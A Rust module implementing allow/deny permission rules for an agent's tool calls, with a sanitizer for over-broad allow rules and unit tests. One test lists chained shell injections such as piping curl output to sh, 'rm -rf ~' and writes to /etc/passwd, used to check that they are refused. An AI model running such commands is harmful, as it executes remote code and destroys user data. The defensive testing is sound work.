//! User allow/deny rules: tool and subject patterns ([`ToolPattern`],
//! [`ArgPattern`]), one [`Rule`] and the merged [`RuleSet`].
//!
//! Rules match a tool name ([`ToolPattern`]) and optionally a glob over the
//! action's canonical subject ([`ArgPattern`]): the command string for `shell`,
//! the display path for file tools, pretty JSON for everything else. Their
//! file form (`[[allow]]` / `[[deny]]` in `tui.toml`), the layering and the
//! realm-file writes are [`crate::config`].

use crate::config::RuleEntry;
use globset::{Glob, GlobBuilder, GlobMatcher};
use serde::{Deserialize, Serialize};
use std::fmt;
use std::path::PathBuf;

/// Errors from rule parsing and persistence.
#[derive(Debug, thiserror::Error)]
pub enum RulesError {
    /// The settings writer refused or failed.
    #[error(transparent)]
    Settings(#[from] crate::config::write::WriteError),
    /// A glob pattern failed to compile.
    #[error("invalid pattern `{pattern}`: {source}")]
    Pattern {
        /// The offending pattern.
        pattern: String,
        /// Underlying globset error.
        #[source]
        source: globset::Error,
    },
    /// A tool pattern was empty.
    #[error("tool pattern is empty")]
    EmptyTool,
    /// Reading or writing a rules file failed.
    #[error("{path}: {source}")]
    Io {
        /// File path.
        path: PathBuf,
        /// Underlying I/O error.
        #[source]
        source: std::io::Error,
    },
    /// A rules file is not valid TOML for [`crate::config::RulesFile`].
    #[error("{path}: {source}")]
    Parse {
        /// File path.
        path: PathBuf,
        /// Underlying TOML error.
        #[source]
        source: toml::de::Error,
    },
    /// The scalar settings in force, merged from every layer, do not read
    /// as their types.
    #[error("the settings in force do not read: {0}")]
    Scalars(#[source] toml::de::Error),
    /// The helper model settings in force do not make a rule (both lists
    /// set).
    #[error(transparent)]
    HelperModels(#[from] crate::config::helper_models::HelperModelsError),
    /// An allow rule too broad to keep ([`Rule::broad_reason`]): the
    /// engine drops such a rule wherever it comes from, so it is not added.
    #[error(
        "`{rule}` is too broad to keep ({reason}): such an allow rule is dropped at once and at every start; allow a narrower pattern"
    )]
    TooBroad {
        /// The rule as `/permissions` writes it.
        rule: String,
        /// Why it is too broad.
        reason: &'static str,
    },
    /// A rule entry set both `arg` and `literal`.
    #[error("rule for `{tool}` sets both `arg` and `literal`")]
    ArgAndLiteral {
        /// The rule's tool pattern.
        tool: String,
    },
}

/// Whether a rule allows or denies.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RuleKind {
    /// Allow without review.
    Allow,
    /// Deny outright.
    Deny,
}

/// Which layer a rule came from.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RuleOrigin {
    /// `~/.rkat/tui.toml`.
    Global,
    /// `<realm>/tui.toml`.
    Realm,
    /// `<project>/.rkat/tui.toml`.
    Project,
    /// Added during this process (not yet persisted).
    Session,
    /// From the command line (`--set`, `--allow`, `--deny`, …); never persisted.
    Cli,
}

impl RuleOrigin {
    /// Lower-case label (`global`, `realm`, `project`, `session`, `cli`).
    #[must_use]
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Global => "global",
            Self::Realm => "realm",
            Self::Project => "project",
            Self::Session => "session",
            Self::Cli => "cli",
        }
    }
}

/// Tool-name matcher: an exact name or a glob such as `mcp__github__*`.
#[derive(Clone)]
pub struct ToolPattern {
    raw: String,
    glob: Option<GlobMatcher>,
}

impl ToolPattern {
    /// Parse a tool pattern.
    ///
    /// # Errors
    ///
    /// Returns [`RulesError`] for empty or invalid glob patterns.
    pub fn new(raw: impl Into<String>) -> Result<Self, RulesError> {
        let raw = raw.into();
        if raw.trim().is_empty() {
            return Err(RulesError::EmptyTool);
        }
        let glob = if has_glob_meta(&raw) {
            Some(compile(&raw)?)
        } else {
            None
        };
        Ok(Self { raw, glob })
    }

    /// The pattern as written.
    pub fn as_str(&self) -> &str {
        &self.raw
    }

    /// Whether the pattern is a plain tool name.
    pub fn is_exact(&self) -> bool {
        self.glob.is_none()
    }

    /// Whether `tool` matches.
    pub fn matches(&self, tool: &str) -> bool {
        match &self.glob {
            Some(glob) => glob.is_match(tool),
            None => self.raw == tool,
        }
    }
}

impl PartialEq for ToolPattern {
    fn eq(&self, other: &Self) -> bool {
        self.raw == other.raw
    }
}

impl Eq for ToolPattern {}

impl fmt::Debug for ToolPattern {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_tuple("ToolPattern").field(&self.raw).finish()
    }
}

/// Matcher over the canonical action subject.
#[derive(Clone)]
pub enum ArgPattern {
    /// Glob (`*` also matches `/` and spaces).
    Glob {
        /// The pattern as written.
        raw: String,
        /// Compiled matcher.
        matcher: GlobMatcher,
    },
    /// The exact subject string (what "allow + add rule" mints).
    Literal(String),
}

impl ArgPattern {
    /// Parse a glob argument pattern.
    ///
    /// # Errors
    ///
    /// Returns [`RulesError::Pattern`] when the glob does not compile.
    pub fn new(raw: impl Into<String>) -> Result<Self, RulesError> {
        let raw = raw.into();
        let matcher = compile(&raw)?;
        Ok(Self::Glob { raw, matcher })
    }

    /// The pattern (or literal) as written.
    pub fn as_str(&self) -> &str {
        match self {
            Self::Glob { raw, .. } => raw,
            Self::Literal(text) => text,
        }
    }

    /// Whether this is a [`Self::Literal`].
    pub fn is_literal(&self) -> bool {
        matches!(self, Self::Literal(_))
    }

    /// Whether `subject` matches.
    pub fn matches(&self, subject: &str) -> bool {
        match self {
            Self::Glob { matcher, .. } => matcher.is_match(subject),
            Self::Literal(text) => text == subject,
        }
    }
}

impl PartialEq for ArgPattern {
    fn eq(&self, other: &Self) -> bool {
        self.is_literal() == other.is_literal() && self.as_str() == other.as_str()
    }
}

impl Eq for ArgPattern {}

impl fmt::Debug for ArgPattern {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Glob { raw, .. } => f.debug_tuple("Glob").field(raw).finish(),
            Self::Literal(text) => f.debug_tuple("Literal").field(text).finish(),
        }
    }
}

impl fmt::Display for ArgPattern {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Glob { raw, .. } => f.write_str(raw),
            Self::Literal(text) => write!(f, "={text:?}"),
        }
    }
}

fn has_glob_meta(s: &str) -> bool {
    s.contains(['*', '?', '[', '{'])
}

fn compile(pattern: &str) -> Result<GlobMatcher, RulesError> {
    let glob: Glob = GlobBuilder::new(pattern)
        .literal_separator(false)
        .backslash_escape(true)
        .build()
        .map_err(|source| RulesError::Pattern {
            pattern: pattern.to_string(),
            source,
        })?;
    Ok(glob.compile_matcher())
}

/// One allow or deny rule.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Rule {
    /// Tool-name matcher.
    pub tool: ToolPattern,
    /// Optional subject matcher; `None` matches every invocation of the tool.
    pub arg: Option<ArgPattern>,
    /// Allow or deny.
    pub kind: RuleKind,
    /// Layer the rule came from.
    pub origin: RuleOrigin,
}

impl Rule {
    /// Build a rule from raw patterns.
    ///
    /// # Errors
    ///
    /// Returns [`RulesError`] when a pattern is invalid.
    pub fn new(
        kind: RuleKind,
        tool: &str,
        arg: Option<&str>,
        origin: RuleOrigin,
    ) -> Result<Self, RulesError> {
        Ok(Self {
            tool: ToolPattern::new(tool)?,
            arg: arg.map(ArgPattern::new).transpose()?,
            kind,
            origin,
        })
    }

    /// A rule matching exactly one subject string (no glob semantics).
    ///
    /// # Errors
    ///
    /// Returns [`RulesError`] when the tool pattern is invalid.
    pub fn literal(
        kind: RuleKind,
        tool: &str,
        subject: impl Into<String>,
        origin: RuleOrigin,
    ) -> Result<Self, RulesError> {
        Ok(Self {
            tool: ToolPattern::new(tool)?,
            arg: Some(ArgPattern::Literal(subject.into())),
            kind,
            origin,
        })
    }

    pub(crate) fn from_entry(
        kind: RuleKind,
        entry: &RuleEntry,
        origin: RuleOrigin,
    ) -> Result<Self, RulesError> {
        match (&entry.arg, &entry.literal) {
            (Some(_), Some(_)) => Err(RulesError::ArgAndLiteral {
                tool: entry.tool.clone(),
            }),
            (None, Some(literal)) => Self::literal(kind, &entry.tool, literal.clone(), origin),
            (arg, None) => Self::new(kind, &entry.tool, arg.as_deref(), origin),
        }
    }

    /// Whether this rule matches the tool and subjects.
    ///
    /// Deny rules match when **any** subject matches; allow rules require
    /// **every** subject to match (an `apply_patch` touching two files is
    /// allowed only when both are covered). For `shell`, the same applies per
    /// simple command of the command line (see [`super::shell_subject`]).
    pub fn matches(&self, tool: &str, subjects: &[String]) -> bool {
        if !self.tool.matches(tool) {
            return false;
        }
        let Some(arg) = &self.arg else {
            return true;
        };
        let shell = tool == "shell";
        match self.kind {
            RuleKind::Deny => subjects.iter().any(|s| {
                if shell {
                    super::shell_subject::deny_matches(arg, s)
                } else {
                    arg.matches(s)
                }
            }),
            RuleKind::Allow => {
                !subjects.is_empty()
                    && subjects.iter().all(|s| {
                        if shell {
                            super::shell_subject::allow_matches(arg, s)
                        } else {
                            arg.matches(s)
                        }
                    })
            }
        }
    }

    /// Whether this rule says what `other` says: its kind, tool and
    /// argument (the layer it came from aside).
    #[must_use]
    pub fn says(&self, other: &Rule) -> bool {
        self.kind == other.kind && self.tool == other.tool && self.arg == other.arg
    }

    /// The serialized form.
    pub fn to_entry(&self) -> RuleEntry {
        let (arg, literal) = match &self.arg {
            Some(ArgPattern::Glob { raw, .. }) => (Some(raw.clone()), None),
            Some(ArgPattern::Literal(text)) => (None, Some(text.clone())),
            None => (None, None),
        };
        RuleEntry {
            tool: self.tool.as_str().to_string(),
            arg,
            literal,
        }
    }

    /// Why this rule is too broad to keep in auto mode, if it is.
    pub fn broad_reason(&self) -> Option<&'static str> {
        if self.kind != RuleKind::Allow {
            return None;
        }
        let tool = self.tool.as_str();
        if tool.trim_matches('*').is_empty() {
            return Some("matches every tool");
        }
        if let Some(rest) = tool.strip_prefix("mcp__")
            && !self.tool.is_exact()
        {
            let tool_part = rest.split_once("__").map_or("", |(_, t)| t);
            if tool_part.trim_matches('*').is_empty() {
                return Some("matches every tool of an MCP server");
            }
        }
        if !self.tool.matches("shell") {
            return None;
        }
        let Some(arg) = &self.arg else {
            return Some("allows every shell command");
        };
        broad_shell_arg(arg.as_str(), !arg.is_literal())
    }
}

/// Interpreters whose wildcard allow rules amount to arbitrary code execution.
const INTERPRETER_PREFIXES: &[&str] = &[
    "python", "node", "bash", "sh", "zsh", "ruby", "perl", "deno", "bun",
];

/// Task runners that execute project-defined scripts.
const RUNNER_PREFIXES: &[&[&str]] = &[
    &["npm", "run"],
    &["npm", "exec"],
    &["npx"],
    &["pnpm"],
    &["yarn"],
    &["cargo", "run"],
    &["make"],
];

fn broad_shell_arg(arg: &str, glob: bool) -> Option<&'static str> {
    let trimmed = arg.trim();
    if trimmed.is_empty() || (glob && trimmed.starts_with(['*', '?', '[', '{'])) {
        return Some("matches any shell command");
    }
    let mut words = trimmed.split_whitespace();
    let first = words.next().unwrap_or_default();
    let first_bare = first.trim_end_matches(['*', '?']);
    let wildcard = glob && has_glob_meta(trimmed);
    if wildcard
        && INTERPRETER_PREFIXES.iter().any(|p| {
            if *p == "python" {
                first_bare.starts_with(p)
            } else {
                first_bare == *p
            }
        })
    {
        return Some("runs an interpreter on arbitrary input");
    }
    let tokens: Vec<&str> = trimmed.split_whitespace().collect();
    for prefix in RUNNER_PREFIXES {
        let matches = prefix.iter().enumerate().all(|(i, p)| {
            tokens
                .get(i)
                .is_some_and(|t| t.trim_end_matches(['*', '?']) == *p)
        });
        if matches {
            return Some("runs project-defined scripts");
        }
    }
    None
}

/// Identifies a rule inside a [`RuleSet`]: a serial number assigned when
/// the rule is added, never reused and never shifted by removing other
/// rules, so an id shown in a denial still names the same rule later.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct RuleId {
    /// Which list.
    pub kind: RuleKind,
    /// Serial number (from 1, shared by both lists).
    pub serial: u64,
}

impl fmt::Display for RuleId {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let kind = match self.kind {
            RuleKind::Allow => "allow",
            RuleKind::Deny => "deny",
        };
        write!(f, "{kind}#{}", self.serial)
    }
}

/// Merged rules from every layer.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct RuleSet {
    allow: Vec<(u64, Rule)>,
    deny: Vec<(u64, Rule)>,
    /// Last serial handed out.
    last: u64,
}

impl RuleSet {
    fn list(&self, kind: RuleKind) -> &[(u64, Rule)] {
        match kind {
            RuleKind::Allow => &self.allow,
            RuleKind::Deny => &self.deny,
        }
    }

    fn list_mut(&mut self, kind: RuleKind) -> &mut Vec<(u64, Rule)> {
        match kind {
            RuleKind::Allow => &mut self.allow,
            RuleKind::Deny => &mut self.deny,
        }
    }

    /// Allow rules with their ids, in order.
    pub fn allow(&self) -> impl ExactSizeIterator<Item = (RuleId, &Rule)> {
        self.with_ids(RuleKind::Allow)
    }

    /// Deny rules with their ids, in order.
    pub fn deny(&self) -> impl ExactSizeIterator<Item = (RuleId, &Rule)> {
        self.with_ids(RuleKind::Deny)
    }

    fn with_ids(&self, kind: RuleKind) -> impl ExactSizeIterator<Item = (RuleId, &Rule)> {
        self.list(kind).iter().map(move |(serial, rule)| {
            (
                RuleId {
                    kind,
                    serial: *serial,
                },
                rule,
            )
        })
    }

    fn first_match(&self, kind: RuleKind, tool: &str, subjects: &[String]) -> Option<RuleId> {
        self.with_ids(kind)
            .find(|(_, r)| r.matches(tool, subjects))
            .map(|(id, _)| id)
    }

    /// First deny rule matching the action.
    pub fn matches_deny(&self, tool: &str, subjects: &[String]) -> Option<RuleId> {
        self.first_match(RuleKind::Deny, tool, subjects)
    }

    /// First allow rule matching the action.
    pub fn matches_allow(&self, tool: &str, subjects: &[String]) -> Option<RuleId> {
        self.first_match(RuleKind::Allow, tool, subjects)
    }

    /// Look up a rule by id.
    pub fn get(&self, id: RuleId) -> Option<&Rule> {
        self.list(id.kind)
            .iter()
            .find(|(serial, _)| *serial == id.serial)
            .map(|(_, rule)| rule)
    }

    /// Add a rule to the matching list (ignores exact duplicates). Returns
    /// the id of the rule (the existing one for a duplicate).
    pub fn push(&mut self, rule: Rule) -> RuleId {
        let kind = rule.kind;
        if let Some((serial, _)) = self.list(kind).iter().find(|(_, r)| r.says(&rule)) {
            return RuleId {
                kind,
                serial: *serial,
            };
        }
        self.last += 1;
        let serial = self.last;
        self.list_mut(kind).push((serial, rule));
        RuleId { kind, serial }
    }

    /// Replace rule `id` with `rule`: in its place and under its id when
    /// both are of one kind, else at the end of the other kind's list
    /// under a new id. Returns the id it has now (`None`: no rule `id`).
    pub fn edit(&mut self, id: RuleId, rule: Rule) -> Option<RuleId> {
        if rule.kind == id.kind {
            let held = self
                .list_mut(id.kind)
                .iter_mut()
                .find(|(serial, _)| *serial == id.serial)?;
            held.1 = rule;
            return Some(id);
        }
        self.remove(id)?;
        self.last += 1;
        let serial = self.last;
        let kind = rule.kind;
        self.list_mut(kind).push((serial, rule));
        Some(RuleId { kind, serial })
    }

    /// Whether a rule other than `except` says what `rule` says (its kind,
    /// tool and argument).
    #[must_use]
    pub fn says_already(&self, rule: &Rule, except: RuleId) -> Option<&Rule> {
        self.with_ids(rule.kind)
            .find(|(id, held)| *id != except && held.says(rule))
            .map(|(_, held)| held)
    }

    /// Remove a rule by id.
    pub fn remove(&mut self, id: RuleId) -> Option<Rule> {
        let list = self.list_mut(id.kind);
        let index = list.iter().position(|(serial, _)| *serial == id.serial)?;
        Some(list.remove(index).1)
    }

    /// Make the rules of `origins` the ones of `rules` that are of
    /// `origins`: a rule held already keeps its id, one no longer there
    /// goes, a new one is pushed (as [`Self::push`]: not when a rule of
    /// another origin is the same). A rule held that now comes only from
    /// another of `origins` (moved from the workspace's file to the
    /// user's) takes that origin, so an edit or removal reaches the file it
    /// is in. The rules of other origins stay. Returns the rules added and
    /// the rules removed.
    pub fn replace(&mut self, origins: &[RuleOrigin], rules: Vec<Rule>) -> (Vec<Rule>, Vec<Rule>) {
        let rules: Vec<Rule> = rules
            .into_iter()
            .filter(|rule| origins.contains(&rule.origin))
            .collect();
        let mut removed = Vec::new();
        for kind in [RuleKind::Allow, RuleKind::Deny] {
            self.list_mut(kind).retain_mut(|(_, held)| {
                if !origins.contains(&held.origin) {
                    return true;
                }
                let mut same = rules.iter().filter(|rule| rule.says(held));
                let Some(first) = same.next() else {
                    removed.push(held.clone());
                    return false;
                };
                let origin = held.origin;
                if first.origin != origin && !same.any(|rule| rule.origin == origin) {
                    held.origin = first.origin;
                }
                true
            });
        }
        let mut added = Vec::new();
        for rule in rules {
            let held = self
                .list(rule.kind)
                .iter()
                .any(|(_, held)| held.says(&rule));
            if !held {
                self.push(rule.clone());
                added.push(rule);
            }
        }
        (added, removed)
    }

    /// Drop allow rules too broad for auto mode; returns the dropped rules.
    pub fn sanitize_for_auto(&mut self) -> Vec<Rule> {
        let (keep, dropped): (Vec<(u64, Rule)>, Vec<(u64, Rule)>) = std::mem::take(&mut self.allow)
            .into_iter()
            .partition(|(_, r)| r.broad_reason().is_none());
        self.allow = keep;
        dropped.into_iter().map(|(_, r)| r).collect()
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;

    fn allow(tool: &str, arg: Option<&str>) -> Rule {
        Rule::new(RuleKind::Allow, tool, arg, RuleOrigin::Realm).unwrap()
    }

    #[test]
    fn tool_patterns() {
        let exact = ToolPattern::new("shell").unwrap();
        assert!(exact.is_exact());
        assert!(exact.matches("shell"));
        assert!(!exact.matches("shell_jobs"));
        let glob = ToolPattern::new("mcp__github__*").unwrap();
        assert!(glob.matches("mcp__github__create_issue"));
        assert!(!glob.matches("mcp__gitlab__x"));
        assert!(ToolPattern::new("  ").is_err());
    }

    #[test]
    fn arg_patterns_span_separators() {
        let p = ArgPattern::new("cargo nextest run*").unwrap();
        assert!(p.matches("cargo nextest run -p meerkat-tui --lib"));
        assert!(!p.matches("cargo run"));
        let path = ArgPattern::new("docs/**").unwrap();
        assert!(path.matches("docs/a/b.md"));
    }

    #[test]
    fn allow_requires_all_subjects_deny_any() {
        let a = allow("apply_patch", Some("src/*"));
        let subjects = vec!["src/a.rs".to_string(), "README.md".to_string()];
        assert!(!a.matches("apply_patch", &subjects));
        let d = Rule::new(
            RuleKind::Deny,
            "apply_patch",
            Some("src/*"),
            RuleOrigin::Realm,
        )
        .unwrap();
        assert!(d.matches("apply_patch", &subjects));
    }

    #[test]
    fn ruleset_ids_and_matching() {
        let mut set = RuleSet::default();
        set.push(
            Rule::new(
                RuleKind::Deny,
                "shell",
                Some("git push*"),
                RuleOrigin::Global,
            )
            .unwrap(),
        );
        set.push(allow("shell", Some("make lint")));
        set.push(allow("shell", Some("make lint")));
        assert_eq!(set.allow.len(), 1, "duplicates are ignored");
        let id = set
            .matches_deny("shell", &["git push --force".into()])
            .unwrap();
        assert_eq!(id.to_string(), "deny#1");
        assert!(set.get(id).is_some());
        assert!(set.matches_deny("shell", &["git status".into()]).is_none());
        assert!(set.remove(id).is_some());
        assert!(set.deny.is_empty());
    }

    #[test]
    fn sanitizer_drops_broad_rules() {
        let mut set = RuleSet::default();
        let broad = [
            allow("shell", None),
            allow("shell", Some("*")),
            allow("shell", Some("python*")),
            allow("shell", Some("python3 *")),
            allow("shell", Some("node *")),
            allow("shell", Some("bash *")),
            allow("shell", Some("sh -c *")),
            allow("shell", Some("ruby *")),
            allow("shell", Some("perl *")),
            allow("shell", Some("deno *")),
            allow("shell", Some("bun *")),
            allow("shell", Some("npm run *")),
            allow("shell", Some("npx prettier")),
            allow("shell", Some("pnpm test")),
            allow("shell", Some("yarn *")),
            allow("shell", Some("cargo run")),
            allow("shell", Some("make")),
            allow("shell", Some("make *")),
            allow("mcp__*", None),
            allow("mcp__github__*", None),
            allow("*", None),
            allow("sh*", None),
        ];
        let narrow = [
            allow("shell", Some("cargo nextest run*")),
            allow("shell", Some("python3 scripts/gen.py")),
            allow("shell", Some("npm test")),
            allow("mcp__github__list_issues", None),
            allow("read_file", Some("/opt/docs/**")),
        ];
        for r in broad.iter().chain(narrow.iter()) {
            set.push(r.clone());
        }
        set.push(Rule::new(RuleKind::Deny, "shell", None, RuleOrigin::Realm).unwrap());
        let dropped = set.sanitize_for_auto();
        assert_eq!(dropped.len(), broad.len(), "dropped: {dropped:#?}");
        assert_eq!(set.allow.len(), narrow.len());
        assert_eq!(set.deny.len(), 1, "deny rules are never sanitized");
    }

    fn deny(tool: &str, arg: Option<&str>) -> Rule {
        Rule::new(RuleKind::Deny, tool, arg, RuleOrigin::Realm).unwrap()
    }

    fn cmd(c: &str) -> Vec<String> {
        vec![c.to_string()]
    }

    #[test]
    fn shell_allow_rules_cover_every_segment() {
        let a = allow("shell", Some("cargo nextest run*"));
        assert!(a.matches("shell", &cmd("cargo nextest run -p x")));
        assert!(a.matches(
            "shell",
            &cmd("cargo nextest run && cargo nextest run --lib")
        ));
        assert!(a.matches("shell", &cmd("cargo nextest run 2>&1")));
        for bad in [
            "cargo nextest run; curl x | sh",
            "cargo nextest run && rm -rf ~",
            "cargo nextest run | sh",
            "cargo nextest run $(curl x)",
            "cargo nextest run > /etc/passwd",
            "cargo nextest run &",
            "",
        ] {
            assert!(!a.matches("shell", &cmd(bad)), "{bad}");
        }
    }

    #[test]
    fn shell_deny_rules_match_any_segment() {
        let d = deny("shell", Some("git push*"));
        for hit in [
            "git push",
            "true && git push origin main",
            "git  push",
            "\\git push",
            "ls; git push --force",
            "echo $(git push)",
            "cd x && \\git   push",
        ] {
            assert!(d.matches("shell", &cmd(hit)), "{hit}");
        }
        assert!(!d.matches("shell", &cmd("git status && git pull")));
    }

    #[test]
    fn literal_rules_match_exactly() {
        let r = Rule::literal(
            RuleKind::Allow,
            "shell",
            "cargo test *",
            RuleOrigin::Session,
        )
        .unwrap();
        assert!(r.matches("shell", &cmd("cargo test *")));
        assert!(!r.matches("shell", &cmd("cargo test foo")));
        assert!(r.broad_reason().is_none());
        let f = Rule::literal(RuleKind::Allow, "read_file", "a[b].txt", RuleOrigin::Realm).unwrap();
        assert!(f.matches("read_file", &["a[b].txt".to_string()]));
        assert!(!f.matches("read_file", &["ab.txt".to_string()]));
        assert!(
            Rule::literal(RuleKind::Allow, "shell", "make", RuleOrigin::Realm)
                .unwrap()
                .broad_reason()
                .is_some()
        );
    }

    /// Replacing the rules of some origins keeps the ids of those that
    /// stay, removes the others and adds the new; other origins' stay.
    #[test]
    fn replacing_an_origin_s_rules_keeps_the_ids_of_those_that_stay() {
        let rule = |tool: &str, origin| Rule::new(RuleKind::Allow, tool, None, origin).unwrap();
        let mut set = RuleSet::default();
        let kept = set.push(rule("read_file", RuleOrigin::Realm));
        set.push(rule("grep", RuleOrigin::Global));
        let cli = set.push(rule("glob", RuleOrigin::Cli));
        let (added, removed) = set.replace(
            &[RuleOrigin::Global, RuleOrigin::Realm],
            vec![
                rule("read_file", RuleOrigin::Realm),
                rule("list_dir", RuleOrigin::Global),
                rule("glob", RuleOrigin::Global),
                rule("never", RuleOrigin::Cli),
            ],
        );
        let tools = |rules: &[Rule]| -> Vec<String> {
            rules.iter().map(|r| r.tool.as_str().to_string()).collect()
        };
        assert_eq!(tools(&added), vec!["list_dir"]);
        assert_eq!(tools(&removed), vec!["grep"]);
        assert_eq!(set.get(kept).unwrap().tool.as_str(), "read_file");
        assert_eq!(set.get(cli).unwrap().origin, RuleOrigin::Cli);
        assert_eq!(set.allow().len(), 3);
    }

    /// A rule held from one file that now comes only from the other keeps
    /// its id and takes the other's origin (an edit or removal then
    /// reaches the file it is in); one in both files keeps its own.
    #[test]
    fn a_rule_that_moved_to_another_file_takes_its_origin() {
        let rule = |tool: &str, origin| Rule::new(RuleKind::Allow, tool, None, origin).unwrap();
        let mut set = RuleSet::default();
        let moved = set.push(rule("read_file", RuleOrigin::Realm));
        let both = set.push(rule("grep", RuleOrigin::Realm));
        let (added, removed) = set.replace(
            &[RuleOrigin::Global, RuleOrigin::Realm],
            vec![
                rule("read_file", RuleOrigin::Global),
                rule("grep", RuleOrigin::Global),
                rule("grep", RuleOrigin::Realm),
            ],
        );
        assert!(
            added.is_empty() && removed.is_empty(),
            "{added:?} {removed:?}"
        );
        assert_eq!(set.get(moved).unwrap().origin, RuleOrigin::Global);
        assert_eq!(set.get(both).unwrap().origin, RuleOrigin::Realm);
    }
}
